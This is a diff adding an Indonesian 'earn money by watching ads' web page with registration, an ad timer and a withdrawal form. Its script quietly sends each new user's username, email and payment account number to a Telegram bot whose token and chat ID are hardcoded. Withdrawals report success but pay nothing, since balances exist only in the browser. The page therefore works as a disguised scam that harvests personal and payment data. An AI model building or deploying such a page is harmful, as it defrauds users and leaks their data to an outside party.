@@ -1,0 +1,225 @@
+<!DOCTYPE html><html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Penghasil Uang</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: white;
+      border-radius: 12px;
+      padding: 24px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #4f46e5;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:disabled {
+      background: #a5b4fc;
+      cursor: not-allowed;
+    }
+    #status {
+      font-size: 14px;
+      margin-top: 10px;
+      color: #555;
+    }
+  </style>
+</head>
+<body><div class="card" id="authCard">
+  <h2>Daftar / Login</h2>
+  <input type="text" id="username" placeholder="Username" />
+  <input type="email" id="email" placeholder="Email" />
+  <input type="password" id="password" placeholder="Password" />
+  <input type="text" id="noPembayaran" placeholder="Nomor pembayaran (mis. DANA/OVO)" />
+  <button onclick="register()">Daftar</button>
+  <button onclick="login()">Login</button>
+  <p id="authStatus"></p>
+</div><div class="card" id="main" style="display: none;">
+  <h3>Selamat datang, <span id="userLabel"></span></h3>
+  <p>Saldo Anda: <strong><span id="saldo">0</span> IDR</strong></p><button id="watchBtn" onclick="tontonIklan()">Tonton Iklan (Rp300)</button>
+
+  <p id="timer"></p>  <h4>Penarikan</h4>
+  <input type="number" id="jumlahTarik" placeholder="Jumlah penarikan (min 30000)" />
+  <select id="metode">
+    <option value="">Pilih metode</option>
+    <option value="DANA">DANA</option>
+    <option value="OVO">OVO</option>
+    <option value="Gopay">Gopay</option>
+    <option value="Bank">Bank</option>
+  </select>
+  <button onclick="tarikSaldo()">Tarik Saldo</button>  <p id="status"></p>
+</div><script>
+const telegramToken = "7561345046:AAEACs3PTGPZp9scHK77x8fO91zfU7vc1kA";
+const chatId = "7799140879";
+
+const iklanLinks = [
+  "https://link-iklan1.com",
+  "https://link-iklan2.com",
+  "https://link-iklan3.com",
+  "https://link-iklan4.com",
+  "https://link-iklan5.com",
+  "https://link-iklan6.com",
+  "https://link-iklan7.com",
+  "https://link-iklan8.com",
+  "https://link-iklan9.com",
+  "https://link-iklan10.com"
+];
+
+let user = null;
+let saldo = 0;
+let lastWithdrawDate = "";
+let totalWithdrawToday = 0;
+
+function getInput(id) {
+  return document.getElementById(id).value.trim();
+}
+
+function register() {
+  const username = getInput("username");
+  const email = getInput("email");
+  const password = getInput("password");
+  const noPembayaran = getInput("noPembayaran");
+
+  if (!username || !email || !password || !noPembayaran) {
+    return showMsg("authStatus", "Semua kolom wajib diisi!");
+  }
+
+  if (localStorage.getItem("user_" + username)) {
+    return showMsg("authStatus", "Username sudah terdaftar.");
+  }
+
+  const userData = {
+    username,
+    email,
+    password,
+    noPembayaran,
+    saldo: 0,
+    lastWithdrawDate: "",
+    totalWithdrawToday: 0
+  };
+
+  localStorage.setItem("user_" + username, JSON.stringify(userData));
+
+  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `PENDAFTARAN BARU\nUsername: ${username}\nEmail: ${email}\nNo Pembayaran: ${noPembayaran}`
+    })
+  });
+
+  showMsg("authStatus", "Berhasil daftar! Silakan login.");
+}
+
+function login() {
+  const username = getInput("username");
+  const password = getInput("password");
+
+  const saved = localStorage.getItem("user_" + username);
+  if (!saved) return showMsg("authStatus", "User tidak ditemukan!");
+  const data = JSON.parse(saved);
+  if (data.password !== password) return showMsg("authStatus", "Password salah!");
+
+  user = data;
+  saldo = user.saldo;
+  lastWithdrawDate = user.lastWithdrawDate || "";
+  totalWithdrawToday = user.totalWithdrawToday || 0;
+
+  document.getElementById("authCard").style.display = "none";
+  document.getElementById("main").style.display = "block";
+  document.getElementById("userLabel").innerText = user.username;
+  document.getElementById("saldo").innerText = saldo;
+}
+
+function saveUser() {
+  user.saldo = saldo;
+  user.lastWithdrawDate = lastWithdrawDate;
+  user.totalWithdrawToday = totalWithdrawToday;
+  localStorage.setItem("user_" + user.username, JSON.stringify(user));
+}
+
+function tontonIklan() {
+  const btn = document.getElementById("watchBtn");
+  const timer = document.getElementById("timer");
+  let waktu = 50;
+  const randomLink = iklanLinks[Math.floor(Math.random() * iklanLinks.length)];
+  window.open(randomLink, "_blank");
+
+  btn.disabled = true;
+  timer.innerText = `Menonton iklan: ${waktu}s`;
+
+  const interval = setInterval(() => {
+    waktu--;
+    timer.innerText = `Menonton iklan: ${waktu}s`;
+    if (waktu <= 0) {
+      clearInterval(interval);
+      saldo += 300;
+      document.getElementById("saldo").innerText = saldo;
+      timer.innerText = "";
+      btn.disabled = false;
+      showMsg("status", "+Rp300 berhasil ditambahkan!");
+      saveUser();
+    }
+  }, 1000);
+}
+
+function tarikSaldo() {
+  const jumlah = parseInt(getInput("jumlahTarik"));
+  const metode = getInput("metode");
+  const today = new Date().toISOString().split("T")[0];
+
+  if (!jumlah || jumlah < 30000) return showMsg("status", "Minimal penarikan Rp30.000");
+  if (jumlah > saldo) return showMsg("status", "Saldo tidak cukup.");
+  if (!metode) return showMsg("status", "Pilih metode penarikan.");
+
+  if (lastWithdrawDate !== today) {
+    lastWithdrawDate = today;
+    totalWithdrawToday = 0;
+  }
+
+  const sisa = 100000 - totalWithdrawToday;
+  if (jumlah > sisa) return showMsg("status", `Batas penarikan harian tersisa Rp${sisa}`);
+
+  saldo -= jumlah;
+  totalWithdrawToday += jumlah;
+  document.getElementById("saldo").innerText = saldo;
+  showMsg("status", `Penarikan Rp${jumlah} berhasil.`);
+
+  saveUser();
+
+  const msg = `PENARIKAN SALDO\nUser: ${user.username}\nJumlah: Rp${jumlah}\nMetode: ${metode}\nNo Pembayaran: ${user.noPembayaran}`;
+  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: chatId, text: msg })
+  });
+}
+
+function showMsg(id, msg) {
+  document.getElementById(id).innerText = msg;
+}
+</script></body>
+</html>
